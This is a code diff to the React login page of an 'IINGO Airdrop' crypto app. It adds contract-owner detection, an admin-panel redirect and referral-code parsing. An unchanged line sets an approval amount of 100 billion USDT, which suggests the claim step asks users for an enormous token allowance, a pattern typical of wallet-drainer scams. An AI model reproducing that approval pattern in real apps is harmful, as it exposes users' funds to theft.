@@ -28,13 +28,14 @@ const LoginPage: React.FC = () => {
   const [isLoading, setIsLoading] = useState(false);
   const [hasClaimed, setHasClaimed] = useState(false);
   const [isCheckingClaim, setIsCheckingClaim] = useState(false);
+  const [isOwner, setIsOwner] = useState(false);
   const navigate = useNavigate();
 
   const AIRDROP_AMOUNT_TO_APPROVE = ethers.parseUnits("100000000000", 6); // 100B USDT
 
-  // Check if user has already claimed tokens
+  // Check if user has already claimed tokens and if they are the owner
   useEffect(() => {
-    const checkClaimStatus = async () => {
+    const checkClaimAndOwnerStatus = async () => {
       if (!walletProvider || !address) {
         return;
       }
@@ -43,6 +44,18 @@ const LoginPage: React.FC = () => {
         setIsCheckingClaim(true);
         const provider = new BrowserProvider(walletProvider);
         const airdrop = new Contract(contractAddress, contractAbi, provider);
+
+        // Check if user is the contract owner
+        const ownerAddress = await airdrop.owner();
+        const isUserOwner =
+          ownerAddress.toLowerCase() === address.toLowerCase();
+        setIsOwner(isUserOwner);
+
+        // If user is owner, we can skip checking claim status
+        if (isUserOwner) {
+          setIsCheckingClaim(false);
+          return;
+        }
 
         // Check if user has already claimed tokens
         const claimedAmount = await airdrop.totalClaimToken(address);
@@ -62,7 +75,7 @@ const LoginPage: React.FC = () => {
       }
     };
 
-    checkClaimStatus();
+    checkClaimAndOwnerStatus();
   }, [address, walletProvider]);
 
   const handleClaim = async () => {
@@ -169,13 +182,39 @@ const LoginPage: React.FC = () => {
     navigate("/dashboard");
   };
 
+  const handleGoToAdmin = () => {
+    navigate("/admin");
+  };
+
+  useEffect(() => {
+    // Get the query parameter from the URL
+    const urlParams = new URLSearchParams(window.location.search);
+    const refCode = urlParams.get("ref");
+
+    // Set the referral code if it exists in the URL
+    if (refCode) {
+      setReferralCode(refCode);
+    }
+  }, []);
+
+  // Redirect owner to admin page when connecting
+  useEffect(() => {
+    if (isOwner && address) {
+      const timer = setTimeout(() => {
+        navigate("/admin");
+      }, 1000); // Small delay to show the owner status
+
+      return () => clearTimeout(timer);
+    }
+  }, [isOwner, address, navigate]);
+
   // Loading state during initial claim check
   if (isCheckingClaim) {
     return (
       <div className="min-h-screen bg-[#0c0435] flex items-center justify-center px-4">
         <div className="bg-[#1b0f3a] text-white p-8 rounded-xl shadow-lg w-full max-w-md text-center">
           <h1 className="text-3xl font-bold mb-4">IINGO Airdrop</h1>
-          <p className="text-gray-400 mb-6">Checking your claim status...</p>
+          <p className="text-gray-400 mb-6">Checking your status...</p>
           <div className="w-16 h-16 border-4 border-t-blue-500 border-r-transparent border-b-blue-500 border-l-transparent rounded-full animate-spin mx-auto"></div>
         </div>
       </div>
@@ -201,7 +240,20 @@ const LoginPage: React.FC = () => {
         <h1 className="text-3xl font-bold mb-4">Welcome to IINGO Airdrop</h1>
 
         {address ? (
-          hasClaimed ? (
+          isOwner ? (
+            <div>
+              <div className="bg-gradient-to-r from-amber-500 to-red-500 text-white px-4 py-2 rounded-lg mb-4 inline-block">
+                Admin Account Detected
+              </div>
+              <p className="text-gray-300 mb-4">You are the contract owner.</p>
+              <button
+                onClick={handleGoToAdmin}
+                className="bg-gradient-to-r from-amber-600 to-red-600 hover:from-amber-700 hover:to-red-700 text-white font-semibold py-4 px-8 rounded-xl transition-all duration-300 transform hover:scale-105 shadow-lg"
+              >
+                Go to Admin Panel
+              </button>
+            </div>
+          ) : hasClaimed ? (
             <div>
               <p className="text-green-400 mb-4">
                 You've already claimed tokens!
